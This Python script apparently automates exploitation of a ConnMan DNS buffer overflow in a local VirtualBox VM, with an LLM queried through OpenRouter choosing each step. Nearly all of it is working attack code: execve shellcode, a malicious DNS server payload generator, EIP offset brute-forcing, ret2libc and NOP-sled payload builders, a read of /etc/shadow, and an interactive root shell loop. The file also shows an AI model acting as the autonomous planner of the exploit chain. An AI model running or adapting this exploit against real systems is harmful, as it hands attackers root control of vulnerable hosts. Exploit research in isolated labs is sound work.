import subprocess
import time
import re
import json
import os
import requests
import paramiko
import struct
from dotenv import load_dotenv
import argparse

# --- SCRIPT CONFIGURATION ---
VBOXMANAGE_PATH = "C:\\Program Files\\Oracle\\VirtualBox\\VBoxManage.exe"
VM_NAME = "ConnMan_Exploit_VM"
VM_USER = "ubuntu"
VM_PASS = "ubuntu"
HOST_IP = "192.168.56.1"
SSH_HOST = "localhost"
SSH_PORT = 2222
AI_MODEL = "deepseek/deepseek-r1-0528:free"

# --- Shellcode (Only used for 'esp' attack mode) ---
linux_x86_shellcode = (
    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
)

def create_dns_script(payload_buffer, verbose=True):
    # This function is unchanged
    payload_str_literal = repr(payload_buffer)
    script_content = f"""
import socket, struct, sys
def dw(x): return struct.pack('>H', x)
class DNSQuery:
    def __init__(self, data):
        self.data=data; self.domain=''
        tipo = (ord(data[2]) >> 3) & 15
        if tipo == 0:
            ini=12; lon=ord(data[ini])
            while lon != 0:
                self.domain+=data[ini+1:ini+lon+1]+'.'; ini+=lon+1; lon=ord(data[ini])
    def response(self, ip):
        packet=''
        if self.domain:
            if 'dos.com' not in self.domain:
                packet+=self.data[:2] + "\\x81\\x80"; packet+=self.data[4:6] + self.data[4:6] + '\\x00\\x00\\x00\\x00'; packet+=self.data[12:]; packet+='\\xc0\\x0c'; packet+='\\x00\\x01\\x00\\x01\\x00\\x00\\x00\\x3c\\x00\\x04'; packet+=str.join('',map(lambda x: chr(int(x)), ip.split('.')))
            else:
                print ">>> Sending MALICIOUS payload for dos.com"
                packet = self.data[:2] + "\\x81\\x80"; packet += dw(1); packet += dw(0x52); packet += dw(0); packet += dw(0)
                packet += ('\\x01X\\x00' + '\\x00\\x01' + '\\x00\\x01' + '\\xc0\\x0d' + {payload_str_literal})
        return packet
if __name__ == '__main__':
    udps = socket.socket(socket.AF_INET, socket.SOCK_DGRAM); udps.bind(('', 53))
    try:
        while 1:
            data, addr = udps.recvfrom(1024); p = DNSQuery(data)
            udps.sendto(p.response(sys.argv[1]), addr)
    except KeyboardInterrupt: print 'Terminating'; udps.close()
"""
    with open("generated_dns_server.py", "w") as f:
        f.write(script_content)
    if verbose:
        print("[ORCHESTRATOR] Successfully created 'generated_dns_server.py'")

def get_ai_next_step(exploit_state, verbose=True, attack_mode='esp'):
    # This function is unchanged
    api_key = os.getenv("OPENROUTER_API_KEY")
    if not api_key: raise ValueError("OPENROUTER_API_KEY not set.")
    phase = exploit_state.get('phase', 'recon')
    
    playbook_name = f"{phase}_playbook.txt"
    if phase == 'deploy_shellcode' and attack_mode == 'ret2libc':
        playbook_name = f"deploy_shellcode_wx_playbook.txt"

    playbook_file = os.path.join("playbooks", playbook_name)

    if verbose:
        print(f"[AI] Current Phase: {phase.upper()}. Loading playbook: {playbook_file}")
    try:
        with open(playbook_file, "r") as f:
            system_prompt = f.read()
    except FileNotFoundError:
        print(f"[ORCHESTRATOR_ERROR] Playbook file '{playbook_file}' not found.")
        return {"action_type": "exit"}
    history_text = "HISTORY (Last 3 Steps):\n"
    if not exploit_state["HISTORY"]:
        history_text += "No actions have been taken yet.\n"
    else:
        for entry in exploit_state["HISTORY"][-3:]:
            command = entry.get('command', 'N/A')
            content = entry.get('content', 'N/A')
            output = entry.get('output', 'N/A').strip().split('\n')[0]
            parsed = entry.get('parsed_data', {})
            history_text += f"Command: {command}, Content: {content}\nOutput: {output}\nParsed Data: {parsed}\n---\n"
    last_action_result = exploit_state["HISTORY"][-1] if exploit_state["HISTORY"] else {"command": "None", "output": "None", "parsed_data": {}}
    user_prompt = f"{history_text}\nLAST_ACTION_RESULT: {json.dumps(last_action_result)}\n\n"
    if phase == 'deploy_shellcode':
        user_prompt += f"EIP_OFFSET: {exploit_state.get('EIP_OFFSET', 0)}\n"
        if attack_mode == 'esp':
            user_prompt += f"CAPTURED_ESP: {exploit_state.get('captured_esp', 'Not Found')}\n"
        else:
            user_prompt += f"SYSTEM_ADDR: {exploit_state.get('system_addr', 'Not Found')}\n"
            user_prompt += f"EXIT_ADDR: {exploit_state.get('exit_addr', 'Not Found')}\n"
            user_prompt += f"BIN_SH_ADDR: {exploit_state.get('bin_sh_addr', 'Not Found')}\n"
    user_prompt += "Based on the history and your current playbook, provide the JSON for the very next step."
    if verbose:
        print("[AI] Querying model for next action...")
    for attempt in range(3):
        try:
            payload_dict = {"model": AI_MODEL, "messages": [{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]}
            response = requests.post("https://openrouter.ai/api/v1/chat/completions", headers={"Authorization": f"Bearer {api_key}"}, json=payload_dict, timeout=180)
            response.raise_for_status()
            response_data = response.json()
            if 'choices' in response_data and response_data['choices']:
                ai_response_text = response_data['choices'][0]['message']['content'].strip()
                match = re.search(r'\{.*\}', ai_response_text, re.DOTALL)
                if match:
                    return json.loads(match.group(0))
            print(f"[ORCHESTRATOR_WARNING] Malformed AI response: {response_data}")
        except Exception as e:
            print(f"[ORCHESTRATOR_ERROR] API call failed: {e}. Retrying...")
            time.sleep(5)
    return {"action_type": "exit"}

def parse_with_ai(task, raw_text, verbose=True):
    if verbose: print(f"[AI PARSER] Task: {task}")
    api_key = os.getenv("OPENROUTER_API_KEY")
    system_prompt = "You are an expert at parsing text and extracting specific information. Respond ONLY with a JSON object containing the requested information."
    user_prompt = f"Your task is to {task}. Here is the text to parse:\n\n---\n{raw_text}\n---"
    
    try:
        payload_dict = {"model": AI_MODEL, "messages": [{"role": "system", "content": system_prompt}, {"role": "user", "content": user_prompt}]}
        response = requests.post("https://openrouter.ai/api/v1/chat/completions", headers={"Authorization": f"Bearer {api_key}"}, json=payload_dict, timeout=60)
        response.raise_for_status()
        response_data = response.json()
        if 'choices' in response_data and response_data['choices']:
            ai_response_text = response_data['choices'][0]['message']['content'].strip()
            match = re.search(r'\{.*\}', ai_response_text, re.DOTALL)
            if match:
                return json.loads(match.group(0))
    except Exception as e:
        print(f"[AI PARSER_ERROR] Failed to parse: {e}")
        return None
    return None

class ExecutionAgent:
    def __init__(self, host, port, user, password, verbose=True):
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.verbose = verbose
        try:
            self.ssh.connect(hostname=host, port=port, username=user, password=password)
            if self.verbose:
                print("[AGENT] SSH Connection Established.")
        except Exception as e: raise e
    def execute(self, command, timeout=60):
        if self.verbose:
            print(f"[AGENT] Executing: {command}")
        try:
            _, stdout, stderr = self.ssh.exec_command(command, timeout=timeout)
            return stdout.read().decode(errors='ignore').strip() + stderr.read().decode(errors='ignore').strip()
        except Exception as e: return f"Command execution failed: {e}"
    def close(self):
        if self.ssh:
            self.ssh.close()
            if self.verbose:
                print("[AGENT] SSH Connection Closed.")

def execute_attack(agent, payload_buffer, trigger_command, verbose=True):
    # This function is unchanged
    create_dns_script(payload_buffer, verbose)
    dns_process = subprocess.Popen(['python2', 'generated_dns_server.py', HOST_IP, '53'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    time.sleep(2)
    if dns_process.poll() is not None:
        return "[ORCHESTRATOR_ERROR] DNS server failed to start.", {}
    agent.execute("sudo killall -9 gdb 2>/dev/null || true")
    gdb_command = f"setsid sudo gdb -p $(pidof {agent.process_name}) -batch -ex 'c' -ex 'info registers' -ex 'x/300xb $esp-200' -ex 'q'"
    _, gdb_stdout, _ = agent.ssh.exec_command(gdb_command)
    time.sleep(3)
    agent.execute(trigger_command)
    if verbose:
        print("[ORCHESTRATOR] Checking for crash data...")
    output = ""
    start_time = time.time()
    while time.time() - start_time < 30 and not gdb_stdout.channel.exit_status_ready():
        if gdb_stdout.channel.recv_ready():
            output += gdb_stdout.channel.recv(1024).decode(errors='ignore')
        time.sleep(0.5)
    output += gdb_stdout.read().decode(errors='ignore')
    dns_process.terminate()
    dns_process.wait()
    parsed_data = {}
    if "SIGSEGV" in output or "segmentation fault" in output.lower():
        if verbose: print("[ORCHESTRATOR] Crash detected!")
        eip_match = re.search(r"eip\s+(0x[0-9a-fA-F]+)", output)
        esp_match = re.search(r"esp\s+(0x[0-9a-fA-F]+)", output)
        if eip_match:
            parsed_data["eip"] = eip_match.group(1).lower()
            if verbose: print(f"[ORCHESTRATOR] EIP captured: {parsed_data['eip']}")
        if esp_match:
            parsed_data["esp"] = esp_match.group(1).lower()
            if verbose: print(f"[ORCHESTRATOR] ESP captured: {parsed_data['esp']}")
    else:
        output += "\n[ORCHESTRATOR_ERROR] No crash detected."
    return output, parsed_data

def find_eip_offset(agent, start_size, history, exploit_state, trigger_command, verbose=True):
    # This function is unchanged
    if verbose:
        print("\n" + "="*20 + " ORCHESTRATOR HAS TAKEN CONTROL FOR OFFSET SEARCH " + "="*20)
        print("[OFFSET_FINDER] Starting JUMP mode...")
    current_size = start_size
    while current_size < start_size + 500:
        current_size += 10
        if verbose: print(f"[OFFSET_FINDER] Jumping to size: {current_size}")
        payload = b'A' * current_size
        service = agent.execute(f"sudo connmanctl services | grep '*' | awk '{{print $3}}' | head -n 1")
        agent.execute(f"sudo connmanctl config {service} --nameservers {HOST_IP}")
        output, parsed = execute_attack(agent, payload, trigger_command, verbose)
        history.append({"command": "orchestrated_attack", "content": current_size, "output": output, "parsed_data": parsed})
        if parsed.get("eip") == '0x41414141':
            if verbose: print(f"[OFFSET_FINDER] Full EIP overwrite at {current_size}. Switching to REFINE mode.")
            break
    else:
        print("[OFFSET_FINDER] ERROR: Could not find full EIP overwrite within safety limit.")
        return None
    if verbose: print("[OFFSET_FINDER] Starting REFINE mode...")
    last_jump_size = current_size
    current_size = last_jump_size - 9
    while current_size < last_jump_size + 10:
        if verbose: print(f"[OFFSET_FINDER] Refining at size: {current_size}")
        payload = b'A' * current_size
        service = agent.execute(f"sudo connmanctl services | grep '*' | awk '{{print $3}}' | head -n 1")
        agent.execute(f"sudo connmanctl config {service} --nameservers {HOST_IP}")
        output, parsed = execute_attack(agent, payload, trigger_command, verbose)
        history.append({"command": "orchestrated_attack", "content": current_size, "output": output, "parsed_data": parsed})
        if parsed.get("eip") == '0x41414141':
            final_offset = current_size
            captured_esp = parsed.get("esp")
            if captured_esp:
                exploit_state['captured_esp'] = captured_esp
                print(f"[OFFSET_FINDER] SUCCESS! Precise EIP offset found: {final_offset}")
                if verbose:
                    print(f"[OFFSET_FINDER] Captured ESP for final payload: {captured_esp}")
                    print("="*20 + " ORCHESTRATOR RETURNING CONTROL TO AI " + "="*20 + "\n")
                return final_offset
            else:
                print("[OFFSET_FINDER] ERROR: Overwrote EIP but could not capture ESP.")
                return None
        current_size += 1
    print("[OFFSET_FINDER] ERROR: Could not find precise offset during refine.")
    return None

def main():
    parser = argparse.ArgumentParser(description="AutoPwn Main Exploit Agent")
    parser.add_argument("--snapshot", required=True)
    parser.add_argument("--attack-mode", required=True, choices=['esp', 'ret2libc'])
    parser.add_argument("--verbose", action="store_true")
    parser.add_argument("--binary-path", required=True)
    parser.add_argument("--process-name", required=True)
    parser.add_argument("--trigger-command", required=True)
    args = parser.parse_args()

    load_dotenv()
    exploit_state = {
        "HISTORY": [], "phase": "recon", "recon_completed": set(),
        "crash_size": 0, "EIP_OFFSET": None,
        "captured_esp": None, "system_addr": None, "exit_addr": None, "bin_sh_addr": None
    }
    agent, staged_payload_buffer = None, None

    try:
        if args.verbose: print("[VMM] Preparing VM...")
        capture_output = not args.verbose
        subprocess.run([VBOXMANAGE_PATH, "controlvm", VM_NAME, "poweroff"], capture_output=True)
        time.sleep(5)
        subprocess.run([VBOXMANAGE_PATH, "snapshot", VM_NAME, "restore", args.snapshot], check=True, capture_output=capture_output)
        subprocess.run([VBOXMANAGE_PATH, "startvm", VM_NAME, "--type", "headless"], check=True, capture_output=capture_output)
        if args.verbose: print("[VMM] Waiting for VM to boot (can be several minutes)...")
        time.sleep(420)
        agent = ExecutionAgent(SSH_HOST, SSH_PORT, VM_USER, VM_PASS, args.verbose)
        agent.binary_path = args.binary_path
        agent.process_name = args.process_name
        
        if args.verbose: print("[AGENT] Setting up environment...")
        agent.execute("echo 'ubuntu' | sudo -S tee /proc/sys/kernel/yama/ptrace_scope <<< 0 > /dev/null")
        agent.execute("echo '[General]\nEnableOnlineCheck = false' | echo 'ubuntu' | sudo -S tee /etc/connman/main.conf > /dev/null")
        agent.execute(f"echo 'ubuntu' | sudo -S systemctl restart {agent.process_name}")
        time.sleep(5)

        while exploit_state['phase'] != 'done':
            current_phase = exploit_state['phase']
            if current_phase == 'find_offset':
                final_offset = find_eip_offset(agent, exploit_state['crash_size'], exploit_state['HISTORY'], exploit_state, args.trigger_command, args.verbose)
                if final_offset is not None:
                    exploit_state['EIP_OFFSET'] = final_offset
                    exploit_state['phase'] = 'deploy_shellcode'
                else:
                    print("[ORCHESTRATOR] Halting due to failure in offset finding.")
                    exploit_state['phase'] = 'done'
                continue
            
            ai_step = get_ai_next_step(exploit_state, args.verbose, args.attack_mode)
            action, content = ai_step.get("action_type"), ai_step.get("content", "")
            if args.verbose: print(f"[AI] Chose action: {action}" + (f" with content: {content}" if content else ""))
            if not action or action == "exit":
                exploit_state['phase'] = 'done'
                continue

            command_output, parsed_data = "", {}

            if action in ["recon_file_type", "recon_stack_canary", "recon_stack_executable"]:
                if action == "recon_file_type": command_output = agent.execute(f"file {agent.binary_path}")
                elif action == "recon_stack_canary": command_output = agent.execute(f"objdump -d {agent.binary_path} | grep '__stack_chk_fail' || echo 'No Stack Canary Found'")
                elif action == "recon_stack_executable": command_output = agent.execute(f"readelf -l {agent.binary_path} | grep 'GNU_STACK' | grep -q 'RWE' && echo 'Executable Stack: Yes' || echo 'Executable Stack: No'")
                exploit_state["recon_completed"].add(action)
            
            elif action == "generate_payload":
                staged_payload_buffer = b'A' * int(content)
                command_output = f"Staged payload with size {int(content)}."
            elif action == "configure_dns":
                service = agent.execute("sudo connmanctl services | grep '*' | awk '{print $3}' | head -n 1")
                if service: command_output = agent.execute(f"sudo connmanctl config {service} --nameservers {HOST_IP}")
                else: command_output = "[ERROR] Could not find connmanctl service."
            elif action == "trigger_exploit":
                if staged_payload_buffer:
                    command_output, parsed_data = execute_attack(agent, staged_payload_buffer, args.trigger_command, args.verbose)
                else: command_output = "[ERROR] No payload staged."

            elif action == "generate_shellcode_payload":
                offset = exploit_state.get("EIP_OFFSET")
                captured_esp_str = exploit_state.get("captured_esp")
                if offset and captured_esp_str:
                    try:
                        return_address = int(captured_esp_str, 16) + 8
                        return_address_packed = struct.pack('<I', return_address)
                        nop_sled = b'\x90' * 32
                        padding_size = offset - len(return_address_packed)
                        padding = b'A' * padding_size
                        staged_payload_buffer = (padding + return_address_packed + nop_sled + linux_x86_shellcode)
                        command_output = f"Final payload staged. Calculated Return Address: {hex(return_address)}"
                    except (ValueError, TypeError) as e: command_output = f"[ERROR] Invalid ESP address format: {e}"
                else: command_output = "[ERROR] Missing EIP offset or captured ESP address in state."
            
            elif action == "recon_find_libc_addresses":
                if args.attack_mode == 'ret2libc':
                    pid = agent.execute(f"pidof {agent.process_name}")
                    if not pid.isdigit():
                        command_output = f"[ERROR] Could not get PID of {agent.process_name}."
                    else:
                        gdb_commands = ['p system', 'p exit', 'q']
                        ex_flags = ' '.join([f'-ex "{cmd}"' for cmd in gdb_commands])
                        gdb_command = f"echo 'ubuntu' | sudo -S gdb -q --pid {pid} --batch {ex_flags}"
                        raw_output = agent.execute(gdb_command)
                        
                        system_result = parse_with_ai("find the hexadecimal address for the 'system' function. Respond with JSON like {'address': '0x...'}", raw_output, args.verbose)
                        exit_result = parse_with_ai("find the hexadecimal address for the 'exit' function. Respond with JSON like {'address': '0x...'}", raw_output, args.verbose)
                        
                        gdb_commands_map = ['info proc map', 'q']
                        ex_flags_map = ' '.join([f'-ex "{cmd}"' for cmd in gdb_commands_map])
                        gdb_command_map = f"echo 'ubuntu' | sudo -S gdb -q --pid {pid} --batch {ex_flags_map}"
                        raw_map_output = agent.execute(gdb_command_map)

                        map_task = "find the start and end addresses for the main executable segment of the 'libc.so' library (the one with 'r-xp' permissions). Respond with JSON like {'start_addr': '0x...', 'end_addr': '0x...'}"
                        map_result = parse_with_ai(map_task, raw_map_output, args.verbose)

                        if system_result and exit_result and map_result and system_result.get('address') and exit_result.get('address') and map_result.get('start_addr'):
                            exploit_state['system_addr'] = system_result.get('address')
                            exploit_state['exit_addr'] = exit_result.get('address')
                            libc_start = map_result.get('start_addr')
                            libc_end = map_result.get('end_addr')

                            find_cmd_str = f'find {libc_start}, {libc_end}, "/bin/sh"'
                            gdb_find_cmd = f"echo 'ubuntu' | sudo -S gdb -q --pid {pid} --batch -ex '{find_cmd_str}' -ex 'q'"
                            raw_find_output = agent.execute(gdb_find_cmd)
                            
                            sh_result = parse_with_ai("find the hexadecimal address of the found pattern. Respond with JSON like {'address': '0x...'}", raw_find_output, args.verbose)
                            if sh_result and sh_result.get('address'):
                                exploit_state['bin_sh_addr'] = sh_result.get('address')
                                command_output = "Successfully found all libc addresses using AI parser."
                                parsed_data = {k: v for k, v in exploit_state.items() if '_addr' in k and v is not None}
                            else:
                                command_output = "[ERROR] AI Parser failed to find '/bin/sh' string."
                        else:
                            command_output = "[ERROR] AI Parser failed to extract one or more required addresses."
                else:
                    command_output = f"[ERROR] Action '{action}' is not valid for attack mode '{args.attack_mode}'."

            elif action == "generate_ret2libc_payload":
                if args.attack_mode == 'ret2libc':
                    offset = exploit_state.get("EIP_OFFSET")
                    system_addr = exploit_state.get("system_addr")
                    exit_addr = exploit_state.get("exit_addr")
                    bin_sh_addr = exploit_state.get("bin_sh_addr")
                    if all([offset, system_addr, exit_addr, bin_sh_addr]):
                        padding = b'A' * (offset - 12)
                        payload = (padding + struct.pack('<I', int(system_addr, 16)) + struct.pack('<I', int(exit_addr, 16)) + struct.pack('<I', int(bin_sh_addr, 16)))
                        staged_payload_buffer = payload
                        command_output = "ret2libc payload staged successfully."
                    else:
                        command_output = "[ERROR] Missing one or more required addresses for ret2libc payload."
                else: command_output = f"[ERROR] Action '{action}' is not valid for attack mode '{args.attack_mode}'."

            elif action == "trigger_shellcode":
                if staged_payload_buffer:
                    if args.verbose: print("[ORCHESTRATOR] Final payload staged. Re-creating DNS script and triggering exploit...")
                    create_dns_script(staged_payload_buffer, args.verbose)
                    agent.execute("sudo connmanctl config $(sudo connmanctl services | grep '*' | awk '{print $3}' | head -n 1) --nameservers " + HOST_IP)
                    dns_process = subprocess.Popen(['python2', 'generated_dns_server.py', HOST_IP, '53'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    time.sleep(2)
                    pid = agent.execute(f"pidof {agent.process_name}")
                    if pid:
                        gdb_command_final = f"sudo gdb -p {pid}"
                        gdb_stdin, gdb_stdout, _ = agent.ssh.exec_command(gdb_command_final, get_pty=True)
                        time.sleep(2)
                        if args.verbose: print("[ORCHESTRATOR] GDB attached. Continuing...")
                        gdb_stdin.write('c\n')
                        gdb_stdin.flush()
                        if args.verbose: print("[ORCHESTRATOR] Triggering exploit from a separate channel...")
                        trigger_client = agent.ssh.invoke_shell()
                        trigger_client.send(f'{args.trigger_command}\n')
                        time.sleep(3)
                        trigger_client.close()
                        if args.verbose: print("[ORCHESTRATOR] Checking for root shell in GDB session...")
                        gdb_stdin.write('shell cat /etc/shadow\n')
                        gdb_stdin.flush()
                        time.sleep(2)
                        output = ""
                        while gdb_stdout.channel.recv_ready():
                            output += gdb_stdout.channel.recv(1024).decode(errors='ignore')
                        command_output = f"--- CAPTURED GDB SESSION OUTPUT ---\n{output}"
                        if "root:" in output and "Permission denied" not in output:
                            parsed_data["root_shell"] = True
                            print("\n" + "="*25); print("  ROOT SHELL ESTABLISHED!"); print("  Enter commands (or 'exit' to quit)"); print("="*25)
                            while True:
                                command = input("root@connmand:~# ")
                                if command.lower() in ['exit', 'quit']: break
                                gdb_stdin.write(f'shell {command}\n'); gdb_stdin.flush()
                                time.sleep(1.5)
                                while gdb_stdout.channel.recv_ready():
                                    print(gdb_stdout.channel.recv(1024).decode(errors='ignore'), end="")
                        gdb_stdin.close()
                    else:
                        command_output = f"[ERROR] Could not get PID of {agent.process_name} for final attack."
                    dns_process.terminate()
                    dns_process.wait()
                else: command_output = "[ERROR] No payload staged for shellcode trigger."
            
            else:
                command_output = f"[ERROR] Unknown action '{action}'."

            exploit_state["HISTORY"].append({"command": action, "content": content, "output": command_output, "parsed_data": parsed_data})
            if args.verbose: print(f"[ORCHESTRATOR] Output:\n{command_output}\n")

            if exploit_state['phase'] == 'recon' and len(exploit_state['recon_completed']) >= 3:
                exploit_state['phase'] = 'find_crash'
                if args.verbose: print("[STATE] Recon complete. Moving to FIND_CRASH phase.")
            elif exploit_state['phase'] == 'find_crash' and parsed_data.get("eip"):
                exploit_state['phase'] = 'find_offset'
                exploit_state['crash_size'] = int(exploit_state['HISTORY'][-3]['content'])
                if args.verbose: print(f"[STATE] Initial crash found at size ~{exploit_state['crash_size']}. Moving to FIND_OFFSET phase.")
            elif exploit_state['phase'] == 'deploy_shellcode' and parsed_data.get("root_shell"):
                print("="*60 + "\n🎉 MISSION COMPLETE: Interactive shell session ended. 🎉\n" + "="*60)
                exploit_state['phase'] = 'done'
            time.sleep(2)
    except Exception as e:
        print(f"An unexpected error occurred: {e}")
        import traceback
        traceback.print_exc()
    finally:
        if agent:
            agent.close()
        print("\n--- Cleaning up resources ---")
        subprocess.run([VBOXMANAGE_PATH, "controlvm", VM_NAME, "poweroff"], capture_output=True)
        print("Done.")

if __name__ == '__main__':
    main()